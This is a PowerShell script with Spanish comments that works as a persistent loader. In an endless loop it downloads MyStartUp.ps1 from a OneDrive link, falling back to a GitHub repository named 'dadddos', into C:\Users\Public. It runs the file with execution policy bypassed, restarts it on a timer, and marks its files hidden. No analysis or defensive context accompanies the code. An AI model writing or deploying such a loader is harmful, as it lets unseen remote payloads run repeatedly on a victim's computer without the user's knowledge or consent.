$downloadUrl = "https://public.dm.files.1drv.com/y4mfd1vbTWS87sihRRAsxxN4pQYL8TXMnufxMu7NL3HPSjb041nAO9rq0Szn0S5rh9k1jjycgkddVf5yu3l7KCiONG7UhLA-h_7Asrh0p5gRld-ddNbahj7oTCMPBH82ozEDIZr5plzKDkwa5Ky3Nss5gfyxtw8vo96zY8JVZhjxYxUjvsbv6XarsCVXCOS-MA9ezwVi7Xf8eq50ZZJQTwlBcMp32CKE_w5EtHDSM5XsCs?AVOverride="
$down = "https://raw.githubusercontent.com/fullcaleta/dadddos/main/MyStartUp.ps1"


$filePath = "C:\Users\Public\MyStartUp.ps1"
$verifyInterval = 534

# Variables para rastrear el PID anterior
$previousPID = $null

while ($true) {
    if (Test-Path -Path $filePath) {
        $process = Start-Process powershell.exe -ArgumentList "-ExecutionPolicy Bypass -File `"$filePath`"" -PassThru
        $previousPID = $process.Id
    }

    Start-Sleep 9.6
    # Terminar el proceso anterior si existe   
    if ($previousPID -ne $null -and (Get-Process -Id $previousPID -ErrorAction SilentlyContinue)) {
        Stop-Process -Id $previousPID -Force
	Start-Sleep 9.6
    }
  
    # Eliminar el archivo si existe
    if (Test-Path -Path $filePath) {
        Remove-Item -Path $filePath -Force
    }
    
    if ((Get-Date).Hour -eq 01) { 
    Invoke-WebRequest -Uri $downloadUrl -OutFile $filePath
    } else {
    Start-Sleep 4.4
    Invoke-WebRequest -Uri $downloadUrl -OutFile $filePath  
    } 

    if (Test-Path "C:\Users\Public\MyStartUp.ps1") {
    Start-Sleep 5
    Invoke-WebRequest -Uri $downloadUrl -OutFile $filePath
    } else {
    Start-Sleep 17
    Invoke-WebRequest -Uri $down -OutFile $filePath
    }
    Start-Sleep 8.8
    # Ejecutar el archivo descargado si existe
    if (Test-Path -Path $filePath) {
        $process = Start-Process powershell.exe -ArgumentList "-ExecutionPolicy Bypass -File `"$filePath`"" -PassThru
        $previousPID = $process.Id
    }
	attrib +h C:\Users\Public\MainWinStyle.ps1
	attrib +h C:\Users\Public\MyStartUp.ps1

    # Esperar el intervalo de iteración
    Start-Sleep -Seconds $verifyInterval

    # Terminar el proceso anterior si existe
    if ($previousPID -ne $null -and (Get-Process -Id $previousPID -ErrorAction SilentlyContinue)) {
        Stop-Process -Id $previousPID -Force
	Start-Sleep 9.6
    }
}
